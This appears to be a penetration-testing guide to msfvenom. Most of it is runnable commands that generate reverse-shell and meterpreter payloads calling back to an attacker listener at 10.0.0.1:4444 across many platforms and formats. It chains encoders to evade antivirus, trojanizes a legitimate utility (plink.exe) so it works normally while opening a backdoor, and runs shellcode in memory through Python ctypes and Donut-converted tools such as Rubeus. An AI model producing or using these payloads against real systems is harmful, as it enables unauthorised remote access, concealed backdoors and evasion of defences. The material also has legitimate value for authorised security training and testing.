# msfvenom Payload Generation Guide

> Deep dive into msfvenom: format selection for every platform, encoder chaining strategies, iteration control, staged vs stageless trade-offs, and custom payload templates. Covers advanced techniques for building reliable, evasion-aware payloads.

## Introduction

msfvenom is the unified payload generation tool in the Metasploit Framework, replacing the older msfpayload and msfencode tools. It generates standalone payloads for every supported platform (Windows, Linux, macOS, Android, Java, PHP, Python, and more) in dozens of output formats. Understanding msfvenom's options is essential because the wrong combination of payload type, format, encoder, and architecture produces non-functional payloads that waste time during engagements. This guide covers the critical decisions: when to use staged vs stageless, which encoder to chain, how to control iterations, and how to target specific platforms and architectures.

---

## 1. Payload Selection

### Finding the Right Payload

```bash
# List all available payloads (pipe through grep to filter)
msfvenom --list payloads | grep -i "reverse_tcp"

# List payloads for specific platform
msfvenom --list payloads | grep -i "windows/x64"
msfvenom --list payloads | grep -i "linux/x64"
msfvenom --list payloads | grep -i "osx"

# Show payload options and description
msfvenom -p windows/x64/meterpreter/reverse_tcp --list-options
```

Payload selection depends on the target platform, the desired post-exploitation capabilities, and the network environment. Meterpreter payloads provide the richest feature set (file operations, process migration, screenshot capture, keylogging, token manipulation) but are also the most heavily signatured. Raw shell payloads (`shell_reverse_tcp`) are smaller, faster, and less detectable but offer only basic command execution.

### Staged vs Stageless Decision Matrix

| Factor | Staged (`/reverse_tcp`) | Stageless (`_reverse_tcp`) |
|--------|-------------------------|----------------------------|
| File size | Small (~15KB) | Large (~200KB+) |
| Network requirements | Needs second-stage download | No additional download |
| Listener requirement | Must use multi/handler | Any TCP listener (nc, socat) |
| AV evasion | Better (less signature surface) | Worse (full payload visible) |
| Egress filtering | Must allow callback + second stage | Only needs single callback |
| Reliability | Depends on second stage delivery | More reliable (self-contained) |

Use staged payloads when egress filtering allows free outbound traffic and you need meterpreter features. Use stageless payloads when the network is restrictive (strict egress filtering, proxies), when you need a simple netcat listener, or when reliability is more important than stealth.

```bash
# Staged meterpreter (requires multi/handler)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o staged.exe

# Stageless meterpreter (works with any listener)
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o stageless.exe

# Compare sizes
ls -la staged.exe stageless.exe
```

---

## 2. Format Selection

### Output Format Reference

```bash
# List all output formats
msfvenom --list formats
```

**Executable formats** (produce runnable binaries):
- `exe` — Windows PE executable (most common for Windows targets)
- `dll` — Windows DLL (for side-loading or rundll32 execution)
- `elf` — Linux ELF binary
- `macho` — macOS Mach-O binary
- `war` — Java WAR archive (deploy to Tomcat/JBoss)
- `jar` — Java JAR archive

**Script formats** (interpreted by runtime):
- `ps1` — PowerShell script
- `py` — Python script
- `php` — PHP script
- `jsp` — JavaServer Page
- `aspx` — ASP.NET page
- `rb` — Ruby script
- `perl` — Perl script
- `bash` — Bash script

**Injection formats** (embed into other delivery mechanisms):
- `hta-psh` — HTML Application wrapping PowerShell
- `vba` — Visual Basic for Applications macro code
- `vba-psh` — VBA macro that executes PowerShell
- `vbs` — VBScript

**Raw and code formats** (for custom integration):
- `raw` — Raw shellcode bytes (pipe to another msfvenom or custom loader)
- `c` — C language unsigned char array
- `python` — Python byte array
- `powershell` — PowerShell byte array
- `base64` — Base64 encoded shellcode

```bash
# Generate multiple formats from same payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o payload.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f dll -o payload.dll
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f ps1 -o payload.ps1
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f hta-psh -o payload.hta
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f c -o payload.c
```

---

## 3. Encoder Chaining and Iteration Control

### Understanding Encoders

```bash
# List all available encoders
msfvenom --list encoders

# Common encoders:
# x86/shikata_ga_nai   - Polymorphic XOR encoder (most popular, x86)
# x64/shikata_ga_nai   - Polymorphic XOR encoder (x64)
# x64/zutto_dekiru     - XOR encoder with different characteristics
# x86/countdown        - Countdown-based encoder
# x86/call4_dword_xor  - Call-based XOR encoder
# x86/jmp_call_additive - Jump-call additive encoder
```

Encoders do not encrypt payloads — they transform the shellcode bytes to avoid specific byte sequences (bad characters) or known signatures. shikata_ga_nai is the most popular encoder because it is polymorphic: each iteration produces different output bytes even with the same input, making signature-based detection harder.

### Iteration Control

```bash
# Single iteration (minimal encoding)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/shikata_ga_nai -i 1 -f exe -o iter1.exe

# 5 iterations (balanced)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/shikata_ga_nai -i 5 -f exe -o iter5.exe

# 10 iterations (maximum reasonable)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/shikata_ga_nai -i 10 -f exe -o iter10.exe
```

Higher iteration counts increase encoding depth, which can evade some signature-based detections. However, more iterations also increase payload size and may trigger behavioral heuristics (polymorphic code patterns). Beyond 10 iterations, returns diminish rapidly against modern AV.

### Multi-Encoder Chains

```bash
# Two-encoder chain: shikata_ga_nai -> zutto_dekiru
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/shikata_ga_nai -i 3 -f raw | \
  msfvenom -p - -e x64/zutto_dekiru -i 3 -f exe -o dual_encoded.exe

# Three-encoder chain for maximum transformation
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/shikata_ga_nai -i 3 -f raw | \
  msfvenom -p - -e x64/zutto_dekiru -i 3 -f raw | \
  msfvenom -p - -e x64/shikata_ga_nai -i 3 -f exe -o triple_encoded.exe

# x86 multi-encoder chain
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -f raw | \
  msfvenom -p - -e x86/countdown -i 5 -f exe -o x86_chain.exe
```

Multi-encoder chains apply different encoding algorithms sequentially, producing output that differs from any single encoder's signature. The `-f raw` format is used for intermediate outputs because it preserves the raw shellcode bytes for the next encoder to process. The final stage uses the target format (exe, dll, etc.). Chaining two or three encoders with 3-5 iterations each is more effective than running a single encoder 15+ times.

---

## 4. Platform and Architecture Targeting

```bash
# Windows x86 (32-bit)
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -a x86 -f exe -o win32.exe

# Windows x64 (64-bit)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -a x64 -f exe -o win64.exe

# Linux x86
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -a x86 -f elf -o lin32.elf

# Linux x64
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -a x64 -f elf -o lin64.elf

# macOS x64
msfvenom -p osx/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -a x64 -f macho -o mac64.macho

# ARM Linux (for embedded devices, Raspberry Pi)
msfvenom -p linux/armle/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -a armle -f elf -o arm.elf

# Java (cross-platform)
msfvenom -p java/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f jar -o crossplatform.jar

# PHP (webshell deployment)
msfvenom -p php/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.php
```

Architecture mismatch is the most common cause of payload failure. An x86 payload will not execute correctly on a 64-bit-only system, and an x64 payload may fail on 32-bit systems. When in doubt about the target architecture, use the Java JAR format (cross-platform) or generate both x86 and x64 variants.

---

## 5. Custom Payload Templates

```bash
# Use a custom executable as template (replaces default template)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -x /usr/share/windows-binaries/plink.exe -f exe -o custom_plink.exe

# Inject as a new thread (keeps original functionality)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -x /usr/share/windows-binaries/plink.exe -k -f exe -o plink_injected.exe

# Generate raw shellcode for custom loaders
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shellcode.bin

# Generate C array for embedding in custom C/C++ programs
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f c -o shellcode.c

# Generate Python byte array for custom loaders
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f python -o shellcode.py
```

The `-x` flag uses a custom executable template instead of the default msfvenom template. Combined with `-k`, the original executable continues to function normally while the payload executes in a separate thread. This is useful for creating trojanized utilities that appear to work normally while establishing a backdoor connection.

---

## References

- [msfvenom Official Documentation](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
- [Metasploit Payload Reference](https://docs.metasploit.com/docs/using-metasploit/basics/metasploit-payload-reference.html)
- [Rapid7 msfvenom Guide](https://docs.rapid7.com/metasploit/msfvenom/)
- [HackTricks - msfvenom](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom)
- [PayloadsAllTheThings - msfvenom](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#msfvenom)

---

## 6. Bad Character Handling for Exploit Development

When developing exploits for buffer overflows or format string vulnerabilities, certain bytes in the payload will break the exploit. These "bad characters" must be excluded from the generated shellcode.

### Identifying Bad Characters

```bash
# Step 1: Generate a byte pattern (0x00 through 0xFF) for testing
# Create a Python script to generate bad character test string
python3 -c "
badchars = b''
for x in range(1, 256):
    badchars += bytes([x])
import sys
sys.stdout.buffer.write(badchars)
" > badchars.bin

# Step 2: Send badchars.bin through the exploit and observe which bytes are corrupted
# Corrupted bytes (changed or truncated) are bad characters

# Step 3: Common bad characters:
# \x00 - null byte (terminates C strings)
# \x0a - newline (breaks line-based protocols)
# \x0d - carriage return (breaks line-based protocols)
# \x20 - space (breaks argument parsing)
# \x25 - percent (breaks format strings)
# \x26 - ampersand (breaks URL parsing)
# \x3c - less than (breaks HTML/XML parsing)

# Step 4: Generate shellcode excluding identified bad characters
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -b '\x00\x0a\x0d\x20\x25\x26\x3c' \
  -f python -o clean_shellcode.py
```

### Bad Character Encoding Performance

```bash
# More bad characters = larger encoder stub = potentially different encoder selected
# Test with minimal bad chars first
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -b '\x00' -f python -o minimal_badchars.py
wc -c minimal_badchars.py

# Compare with extensive bad chars
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -b '\x00\x0a\x0d\xff\x20\x25\x3c\x3e\x23\x3f' \
  -f python -o extensive_badchars.py
wc -c extensive_badchars.py
# The extensive version will be significantly larger due to the encoder stub
```

## 7. Payload Format Conversion and Integration

### Shellcode Integration into Custom Programs

```bash
# Generate shellcode for C/C++ program integration
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f c -o shellcode.c
# Output: unsigned char buf[] = "\xfc\x48\x83\xe4...";
# Copy the array into your C program and execute with function pointer cast

# Generate for Python integration
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f python -o shellcode.py
# Output: buf = b"\x48\x31..."
# Use: import shellcode; import ctypes; ctypes.cast(shellcode.buf, ctypes.CFUNCTYPE(ctypes.c_void_p))()

# Generate for PowerShell integration
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f powershell -o shellcode.ps1
# Output: [Byte[]] $buf = 0xfc,0x48,0x83...

# Generate for C# integration (for use with tools like Covenant or custom C# loaders)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f csharp -o shellcode.cs
```

### Donut: PE to Shellcode Conversion

```bash
# Donut converts any PE file (exe, dll) into position-independent shellcode
# Useful for loading .NET assemblies or custom tools as shellcode

# Install donut
git clone https://github.com/TheWover/donut /opt/donut && cd /opt/donut && make

# Convert an existing executable to shellcode
./donut -i /path/to/payload.exe -o shellcode.bin

# Convert a .NET assembly to shellcode
./donut -i /path/to/Rubeus.exe -p "kerberoast" -o rubeus_shellcode.bin

# Convert with specific parameters
./donut -i /path/to/tool.exe \
  -p "arg1 arg2 arg3" \
  -a 2 \        # Architecture: 1=x86, 2=x64, 3=x86+x64
  -o output.bin

# The generated shellcode can be injected into any process or used with custom loaders
```

## 8. Payload Testing and Validation Workflow

### Automated Testing Pipeline

```bash
# Create a payload testing script that validates generated payloads
cat > test_payload.sh << 'SCRIPT'
#!/bin/bash
PAYLOAD=$1
LISTENER_PORT=4444

if [ -z "$PAYLOAD" ]; then echo "Usage: $0 <payload_file>"; exit 1; fi

echo "[*] Testing payload: $PAYLOAD"

# Step 1: File type verification
echo "[1] File type:"
file $PAYLOAD

# Step 2: Size check (compare staged vs stageless expectations)
echo "[2] File size: $(du -h $PAYLOAD | cut -f1)"

# Step 3: Hash for tracking
echo "[3] MD5: $(md5sum $PAYLOAD | cut -d' ' -f1)"

# Step 4: String analysis (check for suspicious strings)
echo "[4] Suspicious strings:"
strings $PAYLOAD | grep -iE "meterpreter|metasploit|reverse|shell|connect" | head -5

# Step 5: Antivirus scan (if available)
if command -v clamscan &>/dev/null; then
  echo "[5] ClamAV scan:"
  clamscan --no-summary $PAYLOAD
else
  echo "[5] ClamAV not available - skipping AV scan"
fi

# Step 6: Network behavior test (run in sandboxed environment)
echo "[6] To test execution, run in isolated VM:"
echo "    Start listener: nc -lvnp $LISTENER_PORT"
echo "    Execute payload: ./$(basename $PAYLOAD)"
echo "    Expected: reverse shell connection to 10.0.0.1:$LISTENER_PORT"
SCRIPT
chmod +x test_payload.sh
```

### Payload Comparison Matrix

```bash
# Generate and compare multiple payload variants
cat > compare_payloads.sh << 'SCRIPT'
#!/bin/bash
LHOST="10.0.0.1"
LPORT="4444"

echo "=== Payload Comparison Matrix ==="
echo ""

for payload in "windows/x64/shell_reverse_tcp" "windows/x64/meterpreter/reverse_tcp" "windows/x64/meterpreter_reverse_tcp"; do
  name=$(echo $payload | tr '/' '_')
  msfvenom -p $payload LHOST=$LHOST LPORT=$LPORT -f exe -o "/tmp/${name}_plain.exe" 2>/dev/null
  msfvenom -p $payload LHOST=$LHOST LPORT=$LPORT -e x64/shikata_ga_nai -i 5 -f exe -o "/tmp/${name}_encoded.exe" 2>/dev/null

  plain_size=$(stat -f%z "/tmp/${name}_plain.exe" 2>/dev/null || stat -c%s "/tmp/${name}_plain.exe")
  encoded_size=$(stat -f%z "/tmp/${name}_encoded.exe" 2>/dev/null || stat -c%s "/tmp/${name}_encoded.exe")

  echo "Payload: $payload"
  echo "  Plain:   ${plain_size} bytes"
  echo "  Encoded: ${encoded_size} bytes (shikata_ga_nai x5)"
  echo "  Growth:  $(( encoded_size - plain_size )) bytes ($(( (encoded_size - plain_size) * 100 / plain_size ))%)"
  echo ""
done
SCRIPT
chmod +x compare_payloads.sh
```
